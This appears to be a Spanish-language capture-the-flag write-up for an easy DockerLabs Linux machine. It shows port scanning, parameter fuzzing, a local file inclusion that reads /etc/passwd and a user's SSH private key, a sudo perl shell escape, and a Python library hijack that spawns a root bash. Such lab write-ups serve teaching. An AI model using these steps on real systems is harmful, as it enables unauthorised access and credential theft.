Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #ssh #lfi #dockerlabs

![](assets/Pasted%20image%2020251103001153.png)
## Reconocimiento

Empezamos tirando un reconocimiento a la maquina para verificar sus puertos abiertos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n 172.17.0.3 -oN target.txt
--------------------------------------------------------------------------
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-01 20:57 CST
Nmap scan report for 172.17.0.3
Host is up (0.0000090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 42:80:CC:52:5B:B0 (Unknown)
```

Tiramos un segundo escaneo sobre los puertos abiertos para listar mas informacion

- Vemos que esta corriendo un Apache por el puerto 80 y el servicio SSH

```bash
nmap -p22,80 -sCV --min-rate 5000 -Pn -n -oN ports.txt 172.17.0.3
---------------------------------------------------------------------

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 38:bb:36:a4:18:60:ee:a8:d1:0a:61:97:6c:83:06:05 (ECDSA)
|_  256 a3:4e:4f:6f:76:f2:ba:50:c6:1a:54:40:95:9c:20:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: 4You
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeración

### Puerto 80 HTTP

- Vemos una pagina creada por un tal Luisillo pero nada de informacion relevante

![](assets/Pasted%20image%2020251101210028.png)

**Fuzzing de Directorios.**

Procedemos a hacer Fuzzing para descubrir recursos ocultos sobre la pagina web usando `gobuster`

```bash
> gobuster dir -w /home/wndr/Tools/dictionaries/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://172.17.0.3/ -x php,py,html,txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 309] [--> http://172.17.0.3/assets/]
/index.php            (Status: 200) [Size: 2596]
/server-status        (Status: 403) [Size: 275]
```

Lo primero que me llama la atención es la carpeta assets pero no encontramos nada

![](assets/Pasted%20image%2020251101210542.png)

**Fuzzing de Parámetros.**

Podemos tratar de fuzzear por parámetros en el `index.php` ya que no tenemos mucha mas informacion.

- Parametro `secret` encontrada

```bash
> wfuzz -c --hc=403 --hw=169 -z file,/home/wndr/Tools/dictionaries/SecLists/Discovery/Web-Content/raft-medium-directories.txt http://172.17.0.3/index.php?FUZZ=test

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000944:   200        62 L     166 W      2582 Ch     "secret"
```

## Explotación

Haciendo uso del parametro `secret` probamos con un Local File Inclution para tratar de listar el contenido del /etc/passwd

```bash
> secret=/etc/passwd
```

Efectivamente la web es vulnerable a Local File Inclusion y nos lista el contenido del _/etc/passwd_

- Notamos 2 usuarios aparte de root los cuales son _vaxei_ y _lusillo_

![](assets/Pasted%20image%2020251101211127.png)

Podemos tratar de listar la clave `ssh` id_rsa de alguno de estos usuarios aprovechándonos del LFI.

```
> secret=/home/vaxei/.ssh/id_rsa
```

- Pudimos acceder a la clave ssh del usuario `vaxei`.

![](assets/Pasted%20image%2020251101211411.png)

Con la clave _rsa_ guardada en nuestro sistema procedimos a darle permisos y a conectarnos mediante _ssh_

```bash
> chmod 600 key
> ssh -i key vaxei@172.17.0.3
```


## Escalada a usuario luisillo

Dentro del sistema lo primero que hicimos fue listar binarios que pudiéramos ejecutar como `root` o algun otro usuario.


```bash
> sudo -l

User vaxei may run the following commands on 2dfea34fe709:
    (luisillo) NOPASSWD: /usr/bin/perl
```

- En este caso encontramos el binario `perl` que puede ser ejecutado como el usuario luisillo sin necesidad de contraseña.


Procedimos a explotar el binario _perl_ y migrar al usuario `luisillo`

```bash
> sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";'
```

![](assets/Pasted%20image%2020251101212006.png)

Denuevo realizamos el mismo proceso de enumerar binarios con privilegios de `SUDO`.

```bash
> sudo -l
User luisillo may run the following commands on 2dfea34fe709:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
```

- Encontramos un script de python en `/opt/paw.py` que puede ser ejecutado como cualquier usuario sin necesidad de contraseña.

Inspeccione el script para ver que hace:

![](assets/Pasted%20image%2020251101212209.png)

Al ejecutar el script me di cuenta que llama a un modulo `subprocess` que no existe, por lo cual podemos realizar un **Python Library Hijacking** que consiste en forzar a `Python` para que cargue una librería malicioso en lugar de la legitima aprovechando como `Python` busca modulos.

```python
$ cat subprocess.py
import os
os.system("bash -p")
```

- Este script debe de estar en el mismo directorio que el scrip `paw.py`

Ahora puedo ejecutar como `root` el script `paw.py` para spawnear una bash.

- Python intentará importar la librería `subprocess` y Debido al orden de búsqueda de módulos, se cargará primero el archivo `subprocess` malicioso ubicado en el mismo directorio.

```bash
$ sudo -u root /usr/bin/python3 /opt/paw.py
```

Somos root:

![](assets/Pasted%20image%2020251101212443.png)
